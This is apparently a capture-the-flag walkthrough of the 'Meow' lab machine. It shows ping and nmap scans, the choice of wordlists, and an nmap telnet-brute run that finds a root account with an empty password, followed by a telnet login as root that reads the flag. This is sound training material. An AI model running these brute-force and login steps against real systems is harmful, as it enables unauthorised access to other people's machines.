# Meow

Use ping to check if the host is up.
```console
kali@kali:~$ ping 10.129.173.21 -c 1
PING 10.129.173.21 (10.129.173.21) 56(84) bytes of data.
64 bytes from 10.129.173.21: icmp_seq=1 ttl=63 time=10.2 ms

--- 10.129.173.21 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 10.203/10.203/10.203/0.000 ms
```

Run an nmap scan on the top 1000 ports.
```console
kali@kali:~$ nmap -A 10.129.173.21
Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-14 23:52 EST
Nmap scan report for 10.129.173.21
Host is up (0.022s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
23/tcp open  telnet  Linux telnetd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.58 seconds
```

Run a concurrent nmap scan on all ports.
```console
kali@kali:~$ nmap -A 10.129.173.21 -p-
Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-14 23:51 EST
Nmap scan report for 10.129.173.21
Host is up (0.011s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
23/tcp open  telnet  Linux telnetd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.30 seconds
```

Make a ‘Meow’ directory for the lab machine.
```console
kali@kali:~$ sudo mkdir Meow
```

Navigate to the ‘Meow’ directory.
```console
kali@kali:~$ cd Meow
```

Search for very short user and password lists due to the low rate limit for telnet connections attempts.
```console
kali@kali:~/Meow$ sudo find -L /usr/share/wordlists/ -iname "*common*" -exec wc -w {} +
     9 /usr/share/wordlists/metasploit/http_owa_common.txt
 13755 /usr/share/wordlists/metasploit/vxworks_common_20.txt
    10 /usr/share/wordlists/metasploit/sap_common.txt
  4744 /usr/share/wordlists/metasploit/common_roots.txt
    44 /usr/share/wordlists/dirb/mutations_common.txt
  4617 /usr/share/wordlists/dirb/common.txt
    28 /usr/share/wordlists/dirb/extensions_common.txt
   492 /usr/share/wordlists/fern-wifi/common.txt
    44 /usr/share/wordlists/wfuzz/general/mutations_common.txt
   951 /usr/share/wordlists/wfuzz/general/common.txt
    28 /usr/share/wordlists/wfuzz/general/extensions_common.txt
    51 /usr/share/wordlists/wfuzz/others/common_pass.txt
 24773 total
```

We will use /usr/share/wordlists/wfuzz/others/common_pass.txt as the password list. Make your own username list with probable usernames.
```console
kali@kali:~/Meow$ sudo vi users.txt 
```

```console

admin
administrator
local
root
user
remote
meow
```

Use nmap with the telnet-brute script to bruteforce the telnet credentials.
```console
kali@kali:~/Meow$ nmap -p 23 --script telnet-brute --script-args userdb=users.txt,passdb=/usr/share/wordlists/wfuzz/others/common_pass.txt,telnet-brute.timeout=60s 10.129.173.21    

Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-15 00:54 EST
Nmap scan report for 10.129.173.21
Host is up (0.015s latency).

PORT   STATE SERVICE
23/tcp open  telnet
| telnet-brute: 
|   Accounts: 
|     root:<empty> - Valid credentials
|_  Statistics: Performed 370 guesses in 122 seconds, average tps: 2.5

Nmap done: 1 IP address (1 host up) scanned in 132.22 seconds
```

Login to telnet with the credentials we discovered, root:<empty>, and retrieve the flag.
```console
kali@kali:~/Meow$ telnet 10.129.173.21 23
Trying 10.129.173.21...
Connected to 10.129.173.21.
Escape character is '^]'.

  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█


Meow login: root
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 15 Dec 2022 05:59:44 AM UTC

  System load:           0.0
  Usage of /:            41.8% of 7.75GB
  Memory usage:          5%
  Swap usage:            0%
  Processes:             138
  Users logged in:       0
  IPv4 address for eth0: 10.129.173.21
  IPv6 address for eth0: dead:beef::250:56ff:feb9:957a


75 updates can be applied immediately.
31 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Thu Dec 15 05:54:59 UTC 2022 on pts/3
root@Meow:~# whoami
root
root@Meow:~# ls
flag.txt  snap
root@Meow:~# cat flag.txt
****************************4c19
```
